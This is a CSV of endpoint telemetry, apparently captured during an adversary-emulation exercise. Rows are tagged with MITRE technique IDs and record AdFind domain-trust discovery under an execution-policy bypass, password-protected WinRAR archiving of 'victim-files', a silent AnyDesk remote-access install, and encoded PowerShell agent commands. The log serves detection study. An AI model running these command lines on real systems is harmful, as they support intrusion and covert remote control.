"TPP","EventTime","Level","ParentCommandLine","CommandLine","EventID"
"T1087.002","2025-04-06T02:26:21.033853800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T02:26:20.695823800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T02:24:49.288111200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T02:20:57.869721300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:57.520043300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T02:20:56.635164100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:56.264564500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:55.612156100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:55.229178100Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T02:20:54.819172800Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:53.966082600Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T02:20:52.936230100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T02:20:50.033101500Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T02:18:27.114201600Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T02:18:26.337690500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T02:16:46.376448600Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T01:50:45.739063800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T01:50:44.521035400Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T01:48:57.830272800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T01:42:47.741865300Z","2","","","22"
"T1219","2025-04-06T01:42:47.520837400Z","2","","","22"
"T1219","2025-04-06T01:42:47.246759900Z","2","","","22"
"T1219","2025-04-06T01:42:46.838371300Z","2","","","22"
"T1219","2025-04-06T01:42:46.635394900Z","2","","","22"
"T1219","2025-04-06T01:42:46.446597800Z","2","","","22"
"T1219","2025-04-06T01:42:46.182840100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T01:42:45.807818400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T01:42:45.333464600Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:44.480587800Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T01:42:44.136442100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:43.984785900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T01:42:43.801876900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:43.309675900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T01:42:42.633072200Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T01:42:39.895238200Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T01:39:58.274559300Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T01:39:57.260800800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T01:38:17.790961700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1560.001","2025-04-06T01:38:17.790961700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T01:20:50.816001800Z","2","","","22"
"T1219","2025-04-06T01:20:50.618269200Z","2","","","22"
"T1219","2025-04-06T01:20:50.177377600Z","2","","","22"
"T1219","2025-04-06T01:20:49.759870700Z","2","","","22"
"T1219","2025-04-06T01:20:01.106632100Z","2","","","22"
"T1219","2025-04-06T01:19:57.486999000Z","2","","","22"
"T1219","2025-04-06T00:53:18.531131200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T00:53:16.518123800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-control","11"
"T1219","2025-04-06T00:53:15.084790100Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:53:14.003426700Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:13.484709900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:53:13.175797300Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:12.166942000Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:11.226752700Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:53:10.245931400Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:53:07.208161400Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1087.002","2025-04-06T00:50:41.206847400Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:50:40.216932100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:49:08.096737600Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:49:03.013625800Z","3"," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:49:02.710960700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:47:26.879034000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:46:55.812962300Z","3"," powershell","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:46:55.453385400Z","3"," powershell","\Users\Administrator\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1059.001","2025-04-06T00:45:33.106045900Z","2","FromBase64String('CiR1dWlkPSI1ZDk4ZTBkOTY1ZWMiCiIke3V1aWR9OiBydW5uaW5nIgoiNWQ5OGUwZDk2NWVjOiBwYXVzZUxvZyIKJFByb2dyZXNzUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKJHJfPSdkZGMzNjdlZDVjODkzNmVmZTM5NWNmZmVlYzI3OWIwNGZmZDdkYjc4JwokcD0kZW52OlBST0NFU1NPUl","\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Unrestricted -NoLogo -NoProfile -NonInteractive -EncodedCommand CgAkAHUAdQBpAGQAPQAiADUAZAA5ADgAZQAwAGQAOQA2ADUAZQBjACIACgAiACQAewB1AHUAaQBkAH0AOgAgAHIAdQBuAG4AaQBuAGcAIgAKACIANQBkADkAOABlADAAZAA5ADYANQBlAGMAOgAgAHAAYQB1AHMAZQBMAG8AZwAiAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJAByAF8APQAnAGQAZABjADMANgA3AGUAZAA1AGMAOAA5ADMANgBlAGYAZQAzADkANQBjAGYAZgBlAGUAYwAyADcAOQB","1"
"T1059.001","2025-04-06T00:43:10.667134400Z","2","FromBase64String('CiR1dWlkPSIxMmVkMTllM2MwNDgiCiIke3V1aWR9OiBydW5uaW5nIgoiMTJlZDE5ZTNjMDQ4OiBwYXVzZUxvZyIKJFByb2dyZXNzUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKJHJfPSdkZGMzNjdlZDVjODkzNmVmZTM5NWNmZmVlYzI3OWIwNGZmZDdkYjc4JwokcD0kZW52OlBST0NFU1NPUl","\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -ExecutionPolicy Unrestricted -NoLogo -NoProfile -NonInteractive -EncodedCommand CgAkAHUAdQBpAGQAPQAiADEAMgBlAGQAMQA5AGUAMwBjADAANAA4ACIACgAiACQAewB1AHUAaQBkAH0AOgAgAHIAdQBuAG4AaQBuAGcAIgAKACIAMQAyAGUAZAAxADkAZQAzAGMAMAA0ADgAOgAgAHAAYQB1AHMAZQBMAG8AZwAiAAoAJABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJAByAF8APQAnAGQAZABjADMANgA3AGUAZAA1AGMAOAA5ADMANgBlAGYAZQAzADkANQBjAGYAZgBlAGUAYwAyADcAOQB","1"
"T1087.002","2025-04-06T00:41:30.423277900Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," powershell.exe -ExecutionPolicy Bypass -C ""& \""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe\"" -gcb -sc trustdmp""","1"
"T1560.001","2025-04-06T00:39:53.393794500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:36:45.863981200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C & ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1560.001","2025-04-06T00:34:50.544532000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1560.001","2025-04-06T00:34:50.382170100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1087.002","2025-04-06T00:32:12.276077700Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:31:41.300105100Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp","1"
"T1087.002","2025-04-06T00:30:43.551704500Z","3"," powershell","\ExternalPayloads\AdFind.exe"" -sc trustdmp","1"
"T1219","2025-04-06T00:22:25.531113600Z","2","","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","11"
"T1219","2025-04-06T00:21:56.679646800Z","2","","","22"
"T1219","2025-04-06T00:21:25.867584000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:20:54.209382100Z","2","","","22"
"T1219","2025-04-06T00:20:25.798567600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:20:02.983418700Z","2","","","22"
"T1219","2025-04-06T00:19:26.433012600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:18:56.099458800Z","2","","","22"
"T1219","2025-04-06T00:18:26.398694100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:17:48.532922800Z","2","","","22"
"T1219","2025-04-06T00:17:26.038466500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:16:31.832604000Z","2","","","22"
"T1219","2025-04-06T00:16:25.751847200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:15:34.069655100Z","2","","","22"
"T1219","2025-04-06T00:15:25.884155300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:14:30.640161000Z","2","","","22"
"T1219","2025-04-06T00:14:25.611793700Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:13:37.424921400Z","2","","","22"
"T1219","2025-04-06T00:13:26.344893300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:12:44.402893500Z","2","","","22"
"T1219","2025-04-06T00:12:25.999546400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:11:32.252157900Z","2","","","22"
"T1219","2025-04-06T00:11:26.178453300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:10:26.585628300Z","2","","","22"
"T1219","2025-04-06T00:10:26.361335100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:09:25.639817900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:09:17.546153400Z","2","","","22"
"T1219","2025-04-06T00:08:25.655760100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:08:23.613379000Z","2","","","22"
"T1219","2025-04-06T00:08:21.627319500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:08:21.365965000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-06T00:08:20.304726200Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:08:17.704544600Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-06T00:07:28.832026200Z","2","","","22"
"T1219","2025-04-06T00:07:25.780794400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:06:36.004334500Z","2","","","22"
"T1219","2025-04-06T00:06:26.246739800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-06T00:05:40.628002300Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-06T00:05:26.202805500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:05:23.165699000Z","2","","","22"
"T1219","2025-04-06T00:04:25.540176100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:04:24.475307000Z","2","","","22"
"T1560.001","2025-04-06T00:03:50.469520100Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-06T00:03:30.424983400Z","2","","","22"
"T1219","2025-04-06T00:03:26.334037300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:02:26.275509600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:02:24.229408100Z","2","","","22"
"T1219","2025-04-06T00:01:26.301743400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:01:16.018823700Z","2","","","22"
"T1087.002","2025-04-06T00:01:03.870821600Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-06T00:00:26.308403400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-06T00:00:18.459424400Z","2","","","22"
"T1219","2025-04-06T00:00:18.128652300Z","2","","","22"
"T1219","2025-04-05T23:59:26.320444100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:59:22.282765700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:59:04.814924400Z","2","","","22"
"T1219","2025-04-05T23:58:26.165999100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:57:58.783519000Z","2","","","22"
"T1219","2025-04-05T23:57:26.217404300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:57:05.558951900Z","2","","","22"
"T1219","2025-04-05T23:56:26.321574200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:55:57.729052700Z","2","","","22"
"T1560.001","2025-04-05T23:55:57.616500200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:55:26.362758000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:54:51.478590200Z","2","","","22"
"T1219","2025-04-05T23:54:25.629797200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:54:16.900780700Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:53:44.718118700Z","2","","","22"
"T1219","2025-04-05T23:53:26.168362300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:52:31.221361000Z","2","","","22"
"T1219","2025-04-05T23:52:26.187902400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:51:40.035246400Z","2","","","22"
"T1219","2025-04-05T23:51:25.698069000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:50:34.999586900Z","2","","","22"
"T1219","2025-04-05T23:50:25.718131900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:49:26.345237800Z","2","","","22"
"T1219","2025-04-05T23:49:26.179193800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:48:25.657445400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:48:11.766876900Z","2","","","22"
"T1219","2025-04-05T23:48:11.293327600Z","2","","","22"
"T1219","2025-04-05T23:47:26.370239600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:47:09.980202600Z","2","","","22"
"T1219","2025-04-05T23:46:26.094087700Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:45:59.335753600Z","2","","","22"
"T1219","2025-04-05T23:45:25.482769300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:45:06.957518200Z","2","","","22"
"T1219","2025-04-05T23:45:02.076133500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:45:01.665256200Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:44:59.347332900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:44:55.874701900Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:44:26.162924500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:44:03.784894200Z","2","","","22"
"T1219","2025-04-05T23:43:25.966142800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:42:57.238194500Z","2","","","22"
"T1219","2025-04-05T23:42:26.484905500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:42:22.769366500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:41:26.281368800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:41:12.161051100Z","2","","","22"
"T1219","2025-04-05T23:40:25.706722100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
